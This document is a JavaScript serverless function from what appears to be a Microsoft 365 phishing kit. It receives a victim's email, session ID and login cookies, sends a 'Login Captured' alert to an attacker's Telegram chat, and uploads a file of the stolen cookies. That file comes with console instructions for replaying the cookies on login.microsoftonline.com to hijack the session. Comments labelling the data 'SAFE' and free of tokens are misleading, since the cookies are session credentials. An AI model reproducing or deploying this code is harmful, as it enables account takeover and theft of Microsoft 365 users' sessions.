const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting... v4.0 (NO TOKEN OR AUTH CODE EVER INCLUDED)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data:', JSON.stringify(data, null, 2));

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Extract only SAFE data
    const email = data.email || 'oauth-user@microsoft.com';
    const sessionId = data.sessionId || 'no-session';
    const timestamp = new Date().toISOString();
    let cookies = data.formattedCookies || data.cookies || [];
    if (typeof cookies === "string") {
      try {
        cookies = JSON.parse(cookies);
      } catch {
        // fallback: attempt to parse as document.cookie style string
        cookies = cookies.split(';')
          .map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          })
          .filter(Boolean);
      }
    }
    if (!Array.isArray(cookies)) cookies = [];

    const cookieCount = cookies.length;

    // Build the message (NO tokens, NO auth code)
    const uniqueId = Math.random().toString(36).substring(2, 8);
    const simpleMessage = [
      '🔐 Microsoft OAuth Login Captured!',
      '',
      `📧 Email: ${email}`,
      `🔑 Session ID: ${sessionId}`,
      `🕒 Time: ${timestamp}`,
      `🆔 Message ID: ${uniqueId}`,
      '',
      `🍪 Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
    ].join('\n');

    console.log('📤 Sending SAFE message to Telegram:', simpleMessage.substring(0, 100) + '...');

    // Send main safe message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: simpleMessage,
      parse_mode: 'Markdown'
    };

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error:', result);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status
        }),
      };
    }

    // Send a file with just NON-SENSITIVE details (NO tokens, NO auth code)
    let fileSent = false;
    try {
      // Prepare a simple file with only email and cookies
      const cookiesFileContent = `// MICROSOFT 365 CREDENTIALS (NO TOKENS OR AUTH CODE)
// Generated: ${timestamp}
// Email: ${email}
// Session ID: ${sessionId}
// Cookies found: ${cookieCount}

let email = "${email}";
let sessionId = "${sessionId}";
let timestamp = "${timestamp}";

// COOKIE DATA
const cookies = ${JSON.stringify(cookies, null, 2)};

/*
To use these cookies, paste the following in the browser console
(on login.microsoftonline.com):

cookies.forEach(c => {
  document.cookie = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
});
location.reload();
*/

// END OF FILE
`;

      const fileName = `microsoft365_cookies_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;

      // Create proper multipart form data for file upload
      const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;

      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n--${boundary}--\r\n`;

      // Send file to Telegram
      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        },
        body: formData,
      });

      if (fileResponse.ok) {
        const fileResult = await fileResponse.json();
        fileSent = true;
        console.log('✅ Credentials file sent to Telegram successfully');
      } else {
        const fileError = await fileResponse.text();
        console.error('❌ File upload failed:', fileError);
      }
    } catch (fileError) {
      console.error('❌ File generation error:', fileError);
      fileSent = false;
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully (NO TOKENS, NO AUTH CODE)',
        telegramMessageId: result.message_id,
        fileSent,
        cookieCount
      }),
    };

  } catch (error) {
    console.error('❌ Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };